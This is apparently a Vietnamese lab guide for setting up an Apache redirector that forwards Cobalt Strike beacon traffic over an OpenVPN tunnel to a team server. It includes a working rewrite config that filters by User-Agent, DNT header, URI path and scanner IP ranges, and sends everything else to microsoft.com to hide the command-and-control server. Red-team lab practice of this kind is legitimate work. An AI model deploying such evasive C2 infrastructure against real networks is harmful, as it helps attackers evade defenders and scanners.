# Apache Redirector — VM1 CentOS 7

## Mô hình hoạt động

```
Beacon (VM3)
    |
    v
VM1 CentOS 7 :80/:443  <-- Apache Redirector (4-layer filter)
    |
    | (qua OpenVPN tunnel 10.8.0.x)
    v
VM2 Kali :80/:443      <-- Cobalt Strike Team Server
```

---

## Cài đặt Apache

```bash
yum install -y httpd mod_ssl
systemctl enable --now httpd
firewall-cmd --permanent --add-port=80/tcp
firewall-cmd --permanent --add-port=443/tcp
firewall-cmd --reload
```

---

## File config: /etc/httpd/conf.d/redirector.conf

```apache
<VirtualHost *:80>
    ServerName 192.168.100.10
    ProxyRequests Off
    ProxyPreserveHost On
    RewriteEngine On

    # ============================================================
    # Layer 1: User-Agent filter
    # Chỉ cho phép UA khớp CS Malleable profile
    # Nếu UA sai → redirect về microsoft.com (trông innocent)
    # ============================================================
    RewriteCond %{HTTP_USER_AGENT} !^Mozilla/5\.0.*Windows.*rv:109\.0.*Gecko.*Firefox/115\.0$ [NC]
    RewriteRule .* https://www.microsoft.com/ [R=302,L]

    # ============================================================
    # Layer 2: Custom header DNT:1
    # Beacon tự thêm header DNT:1 vào mỗi request
    # Nếu không có header này → không phải beacon → redirect
    # ============================================================
    RewriteCond %{HTTP:DNT} !^1$
    RewriteRule .* https://www.microsoft.com/ [R=302,L]

    # ============================================================
    # Layer 3: URI path filter
    # Chỉ cho phép path /updates/ (khớp CS profile)
    # Request khác path → redirect
    # ============================================================
    RewriteCond %{REQUEST_URI} !^/updates/
    RewriteRule .* https://www.microsoft.com/ [R=302,L]

    # ============================================================
    # Layer 4: Block scanner IPs
    # Chặn các IP của Shodan, Censys, internet scanner
    # Các dải IP scanner phổ biến
    # ============================================================
    RewriteCond %{REMOTE_ADDR} ^66\.240\. [OR]
    RewriteCond %{REMOTE_ADDR} ^198\.20\. [OR]
    RewriteCond %{REMOTE_ADDR} ^162\.142\.
    RewriteRule .* https://www.microsoft.com/ [R=302,L]

    # ============================================================
    # Forward traffic hợp lệ về CS Team Server trên VM2
    # Qua OpenVPN tunnel: 10.8.0.2 là IP VM2 trên VPN
    # ============================================================
    RewriteRule ^/updates/(.*)$ http://10.8.0.2:80/updates/$1 [P,L]

    ErrorLog /var/log/httpd/redirector_error.log
    CustomLog /var/log/httpd/redirector_access.log combined
</VirtualHost>
```

---

## Giải thích 4 lớp lọc

| Layer | Kiểm tra | Nếu fail |
|-------|----------|----------|
| 1 | User-Agent khớp CS profile | Redirect microsoft.com |
| 2 | Header `DNT: 1` có trong request | Redirect microsoft.com |
| 3 | URI bắt đầu bằng `/updates/` | Redirect microsoft.com |
| 4 | IP không thuộc dải scanner | Redirect microsoft.com |

**Chỉ khi pass cả 4 lớp** → traffic được proxy về CS server.

---

## Apply và kiểm tra

```bash
# Kiểm tra syntax
httpd -t

# Restart Apache
systemctl restart httpd

# Xem log realtime
tail -f /var/log/httpd/redirector_access.log
```

---

## Test redirector

**Test từ VM2 (Kali) — request hợp lệ (pass 4 lớp):**

```bash
curl -v \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0" \
  -H "DNT: 1" \
  http://192.168.100.10/updates/beacon
```

Kết quả mong đợi: forward về CS server (10.8.0.2)

**Test request không hợp lệ (UA sai):**

```bash
curl -v http://192.168.100.10/updates/beacon
```

Kết quả mong đợi: redirect 302 về microsoft.com

---

## Lưu ý

- `10.8.0.2` là IP của VM2 trên OpenVPN tunnel (`tun0`)
- Verify IP VM2 trên VPN: chạy `ip addr show tun0` trên VM2
- Nếu IP khác 10.8.0.2 thì sửa lại dòng RewriteRule cuối
